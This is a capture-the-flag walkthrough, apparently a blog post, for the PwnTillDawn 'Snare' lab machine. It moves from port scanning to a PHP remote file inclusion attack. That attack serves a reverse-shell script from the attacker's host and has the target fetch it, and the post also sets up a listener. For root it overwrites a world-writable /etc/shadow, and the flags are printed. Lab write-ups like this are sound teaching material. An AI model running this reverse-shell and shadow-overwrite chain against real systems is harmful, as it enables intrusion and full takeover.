---
layout: writeup
title: "Snare Machine Writeup"
date: 2025-05-12
platform: PwnTillDawn
---

# Snare Machine (10.150.150.18) - Walkthrough

## Initial Enumeration

### Port Scanning

Initial port discovery:

```shell
$ sudo nmap --min-rate 10000 -p- 10.150.150.18
22/tcp open ssh
80/tcp open http
```

Detailed service enumeration:

```shell
$ sudo nmap -sS -sV -A -p22,80 -T4 -v -oN Nmap.md 10.150.150.18
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
```

### Web Directory Enumeration

```shell
$ dirsearch -u http://10.150.150.18/ -t 25 -o dirsearch.md

# Key findings:
[00:04:42] 200 - 355B - /about.php
[00:05:10] 200 - 323B - /contact.php
[00:05:23] 200 - 326B - /home.php
[00:05:25] 301 - 317B - /includes -> http://10.150.150.18/includes/
[00:05:51] 200 - 82B - /README.md
```

Checking README.md content:

```shell
$ curl http://10.150.150.18/README.md
# Result:
# basic-sample-php-template-example
Explanation for organizing the file structure
```

## Exploitation Phase

### Setting Up for RFI Exploitation

1. Preparing reverse shell:

```shell
# Copy PHP reverse shell template
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# Edit shell.php to add our IP and port
$ nano shell.php
# Modified:
$ip = '10.66.67.198';
$port = 1234;

# Exploit Endpoint 
# -> 'http://10.150.150.18/index.php?page=contact' 
# Exploitation payload 
# -> curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'

# start python http server 
$ python -m http.server 80 

# listing ncat listner 
$ rlwrap ncat -nvlp 1234 

# execute payload 
$ curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'
```

## Initial Access Enumeration

After getting shell:

```shell
# Check user context
$ id && whoami && hostname
# Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
snare

# Find first flag
$ find / -name FLAG1.txt 2>/dev/null
$ cat /home/snare/FLAG1.txt
# Output: e335462da856f39997bffdc04b8d89ce1104fcc5
```

## Privilege Escalation

### Enumeration for PE Vector

```shell
# Search for writable files
$ find / -not -type l -perm -o+w 2>/dev/null | grep -v proc -v sys
# Found writable shadow file
$ ls -la /etc/shadow
# Output: -rwxrwxrwx 1 root shadow 1129 Nov 20 2020 /etc/shadow
```

### Exploiting Shadow File

1. On attacking machine:

```shell
# Generate new password hash
$ mkpasswd -m sha-512 Password@123
# Output hash: $6$/GabzAw5BMMvbQOI$8PUfneBnk0x3nQRo7k1GxUdzlN5QeN/qOgOyVBvhwAj4DONHYfJNBdevF2f9AHxcwOgw6nL11HnWBSbpESxd61

# Create modified shadow file
$ nano shadow
# Replace root's hash with new hash
```

2. On target machine:

```shell
# Download and replace shadow file
$ curl http://10.66.67.198/shadow > /etc/shadow

# Switch to root
$ su root
Password: Password@123

# Verify root access
$ whoami && id && hostname
# Output:
root
uid=0(root) gid=0(root) groups=0(root)
snare

# Get final flag
$ cat /root/FLAG2.txt
# Output: 2b0286a69b276189afe50517304963e5fa5982d9
```

## Tools Used

- nmap: Port scanning and service enumeration
- dirsearch: Web directory enumeration
- curl: Web requests and file transfers
- netcat: Reverse shell listener
- Python: HTTP server for hosting files
- mkpasswd: Password hash generation

## Vulnerabilities Exploited

1. Remote File Inclusion (RFI) in PHP application
2. Writable /etc/shadow file

## Flags

1. User Flag: `e335462da856f39997bffdc04b8d89ce1104fcc5`
2. Root Flag: `2b0286a69b276189afe50517304963e5fa5982d9`
